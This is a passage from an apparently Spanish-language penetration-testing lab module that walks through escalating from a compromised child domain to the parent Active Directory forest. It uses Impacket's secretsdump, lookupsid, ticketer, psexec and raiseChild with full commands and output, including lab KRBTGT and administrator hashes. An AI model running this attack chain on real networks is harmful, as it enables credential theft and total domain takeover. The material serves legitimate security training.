Podemos también realizar el ataque mostrado en la sección anterior desde un host de ataque Linux. Para hacerlo, todavía necesitaremos recopilar la misma información:

- El hash de KRBTGT para el child domain
- El SID para el child domain
- El nombre de un usuario objetivo en el child domain (¡no necesita existir!)
- El FQDN del child domain
- El SID del grupo Enterprise Admins del root domain

Una vez que tengamos control total del child domain, `LOGISTICS.INLANEFREIGHT.LOCAL`, podemos usar `secretsdump.py` para realizar DCSync y obtener el hash NTLM para la cuenta KRBTGT.

### Performing DCSync with secretsdump.py

```r
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
krbtgt:des-cbc-md5:fee04c3d026d7538
[*] Cleaning up...
```

Luego, podemos usar [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) del toolkit de Impacket para realizar fuerza bruta de SID y encontrar el SID del child domain. En este comando, lo que especifiquemos para la dirección IP (la IP del domain controller en el child domain) se convertirá en el domain objetivo para una búsqueda de SID. La herramienta nos devolverá el SID para el domain y los RIDs para cada usuario y grupo que podrían usarse para crear su SID en el formato `DOMAIN_SID-RID`. Por ejemplo, del siguiente output, podemos ver que el SID del usuario `lab_adm` sería `S-1-5-21-2806153819-209893948-922872689-1001`.

### Performing SID Brute Forcing using lookupsid.py

```r
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 172.16.5.240
[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
500: LOGISTICS\Administrator (SidTypeUser)
501: LOGISTICS\Guest (SidTypeUser)
502: LOGISTICS\krbtgt (SidTypeUser)
512: LOGISTICS\Domain Admins (SidTypeGroup)
513: LOGISTICS\Domain Users (SidTypeGroup)
514: LOGISTICS\Domain Guests (SidTypeGroup)
515: LOGISTICS\Domain Computers (SidTypeGroup)
516: LOGISTICS\Domain Controllers (SidTypeGroup)
517: LOGISTICS\Cert Publishers (SidTypeAlias)
520: LOGISTICS\Group Policy Creator Owners (SidTypeGroup)
521: LOGISTICS\Read-only Domain Controllers (SidTypeGroup)
522: LOGISTICS\Cloneable Domain Controllers (SidTypeGroup)
525: LOGISTICS\Protected Users (SidTypeGroup)
526: LOGISTICS\Key Admins (SidTypeGroup)
553: LOGISTICS\RAS and IAS Servers (SidTypeAlias)
571: LOGISTICS\Allowed RODC Password Replication Group (SidTypeAlias)
572: LOGISTICS\Denied RODC Password Replication Group (SidTypeAlias)
1001: LOGISTICS\lab_adm (SidTypeUser)
1002: LOGISTICS\ACADEMY-EA-DC02$ (SidTypeUser)
1103: LOGISTICS\DnsAdmins (SidTypeAlias)
1104: LOGISTICS\DnsUpdateProxy (SidTypeGroup)
1105: LOGISTICS\INLANEFREIGHT$ (SidTypeUser)
1106: LOGISTICS\htb-student_adm (SidTypeUser)
```

Podemos filtrar el ruido pasando el output del comando a grep y buscando solo el SID del domain.

### Looking for the Domain SID

```r
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

Password:

[*] Domain SID is: S-1-5-21-2806153819-209893948-92287268
```

A continuación, podemos ejecutar nuevamente el comando, apuntando al Domain Controller de INLANEFREIGHT (DC01) en 172.16.5.5 y obtener el `SID S-1-5-21-3842939050-3880317879-2865463114` del domain y adjuntar el RID del grupo Enterprise Admins. [Aquí](https://adsecurity.org/?p=1001) hay una lista útil de SIDs conocidos.

### Grabbing the Domain SID & Attaching to Enterprise Admin's RID

```r
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

Password:
[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: INLANEFREIGHT\administrator (SidTypeUser)
501: INLANEFREIGHT\guest (SidTypeUser)
502: INLANEFREIGHT\krbtgt (SidTypeUser)
512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
513: INLANEFREIGHT\Domain Users (SidTypeGroup)
514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
```

Hemos recopilado los siguientes puntos de datos para construir el comando para nuestro ataque. Una vez más, usaremos el usuario inexistente `hacker` para forjar nuestro Golden Ticket.

- El hash de KRBTGT para el child domain: `9d765b482771505cbe97411065964d5f`
- El SID para el child domain: `S-1-5-21-2806153819-209893948-922872689`
- El nombre de un usuario objetivo en el child domain (¡no necesita existir!): `hacker`
- El FQDN del child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`
- El SID del grupo Enterprise Admins del root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`

Luego, podemos usar [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) del toolkit de Impacket para construir un Golden Ticket. Este ticket será válido para acceder a recursos en el child domain (especificado por `-domain-sid`) y el parent domain (especificado por `-extra-sid`).

### Constructing a Golden Ticket using ticketer.py

```r
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in hacker.ccache
```

El ticket se guardará en nuestro sistema como un [credential cache (ccache)](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file, que es un archivo usado para guardar credenciales Kerberos. Configurar la variable de entorno `KRB5CCNAME` le dice al sistema que use este archivo para intentos de autenticación Kerberos.

### Setting the KRB5CCNAME Environment Variable

```r
export KRB5CCNAME=hacker.ccache 
```

Podemos verificar si podemos autenticarnos exitosamente en el Domain Controller del parent domain usando [Impacket's version of Psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py). Si tiene éxito, seremos llevados a una shell SYSTEM en el Domain Controller objetivo.

### Getting a SYSTEM shell using Impacket's psexec.py

```r
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 172.16.5.5.....
[*] Found writable share ADMIN$
[*] Uploading file nkYjGWDZ.exe
[*] Opening SVCManager on 172.16.5.5.....
[*] Creating service eTCU on 172.16.5.5.....
[*] Starting service eTCU.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
ACADEMY-EA-DC01
```

Impacket también tiene la herramienta [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py), que automatizará la escalada del child domain al parent domain. Necesitamos especificar el domain controller objetivo y las credenciales de un usuario administrativo en el child domain; el script hará el resto. Si revisamos el output, veremos que comienza enumerando los fully qualified domain names (FQDN) del child y parent domain. Luego:

- Obtiene el SID para el grupo Enterprise Admins del parent domain
- Recupera el hash para la cuenta KRBTGT en el child domain
- Crea un Golden Ticket
- Inicia sesión en el parent domain
- Recupera credenciales para la cuenta de Administrator en el parent domain

Finalmente, si se especifica el switch `target-exec`, se autentica en el Domain Controller del parent domain a través de Psexec.

### Performing the Attack with raiseChild.py

```r
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
[*] Forest FQDN is: INLANEFREIGHT.LOCAL
[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
[*] Getting credentials for INLANEFREIGHT.LOCAL
INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
[*] Target User account name is administrator
INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file BnEGssCE.exe
[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Creating service UVNb on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Starting service UVNb.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>exit
[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....
[*] Stopping service UVNb.....
[*] Removing service UVNb.....
[*] Removing file BnEGssCE.exe.....
```

El script enumera el workflow y proceso en un comentario de la siguiente manera:

```r
#   The workflow is as follows:
#       Input:
#           1) child-domain Admin credentials (password, hashes or aesKey) in the form of 'domain/username[:password]'
#              The domain specified MUST be the domain FQDN.
#           2) Optionally a pathname to save the generated golden ticket (-w switch)
#           3) Optionally a target-user RID to get credentials (-targetRID switch)
#              Administrator by default.
#           4) Optionally a target to PSEXEC with the target-user privileges to (-target-exec switch).
#              Enterprise Admin by default.
#
#       Process:
#           1) Find out where the child domain controller is located and get its info (via [MS-NRPC])
#           2) Find out what the forest FQDN is (via [MS-NRPC])
#           3) Get the forest's Enterprise Admin SID (via [MS-LSAT])
#           4) Get the child domain's krbtgt credentials (via [MS-DRSR])
#           5) Create a Golden Ticket specifying SID from 3) inside the KERB_VALIDATION_INFO's ExtraSids array
#              and setting expiration 10 years from now
#           6) Use the generated ticket to log into the forest and get the target user info (krbtgt/admin by default)
#           7) If file was specified, save the golden ticket in ccache format
#           8) If target was specified, a PSEXEC shell is launched
#
#       Output:
#           1) Target user credentials (Forest's krbtgt/admin credentials by default)
#           2) A golden ticket saved in ccache for future fun and profit
#           3) PSExec Shell with the target-user privileges (Enterprise Admin privileges by default) at target-exec
#              parameter.
```

Aunque herramientas como `raiseChild.py` pueden ser útiles y ahorrarnos tiempo, es esencial entender el proceso y ser capaces de realizar la versión más manual recopilando todos los puntos de datos requeridos. En este caso, si la herramienta falla, es más probable que entendamos por qué y podamos solucionar qué está faltando, lo que no podríamos hacer si simplemente ejecutamos esta herramienta sin más. En un entorno de producción de cliente, **siempre** debemos tener cuidado al ejecutar cualquier tipo de script de "autopwn" como este, y siempre mantenernos cautelosos y construir los comandos manualmente cuando sea posible. Existen otras herramientas que pueden tomar datos de una herramienta como BloodHound, identificar caminos de ataque y realizar una función de "autopwn" que puede intentar realizar cada acción en una cadena de ataque para elevarnos a Domain Admin (como un largo camino de ataque ACL). Recomendaría evitar herramientas como estas y trabajar con herramientas que entendamos completamente, y que también nos den el mayor grado de control durante todo el proceso.

`¡No queremos decirle al cliente que algo falló porque usamos un script de "autopwn"!`

---

## More Fun

En la siguiente sección, discutiremos brevemente algunas técnicas que se pueden usar para el abuso de trust cross-forest cuando nos encontremos en un entorno con un trust bidireccional forest (lo que significa que podemos autenticarnos en otro forest). No cubriremos todos los posibles ataques de trust cross-forest, ya que serán tratados en detalle en módulos posteriores.